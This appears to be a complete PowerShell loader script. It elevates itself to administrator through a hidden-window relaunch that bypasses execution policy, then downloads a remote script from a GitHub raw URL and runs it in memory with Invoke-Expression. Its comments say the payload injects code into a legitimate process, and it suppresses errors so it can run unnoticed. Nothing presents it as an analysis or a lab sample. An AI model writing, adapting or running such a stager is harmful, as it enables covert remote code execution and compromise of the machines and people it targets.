# Function to check if running as administrator
function Test-Administrator {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Attempt to relaunch the script as admin if not already running as admin
if (-not (Test-Administrator)) {
    try {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WindowStyle Hidden -Verb RunAs -ErrorAction continue
        exit
    } catch {
        # If the relaunch fails, continue with the script
        #Write-Output "Failed to run as administrator. Continuing with current privileges."
    }
}

# URL of the script to download for exe a way to create exe again form it's bytes on download
$scriptUrl = "https://raw.githubusercontent.com/cyberre124/test/main/atmon.ps1"

try {
    # Download the script content
    $response = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0

    # Check if the response is valid
    if ($response.StatusCode -eq 200) {
        # Extract the script content as a string
        $scriptContent = $response.Content

        # Output the script content for debugging purposes (optional, remove in production)
        #Write-Output "Downloaded script content:"
        #Write-Output $scriptContent

        # Execute the script in memory and process injection calls here to injection follwing content into legtimate process
        Invoke-Expression -Command $scriptContent
    } else {
        #Write-Error "Failed to download script. Status code: $($response.StatusCode)"
    }
} catch {
    #Write-Error "An error occurred: $_"
}
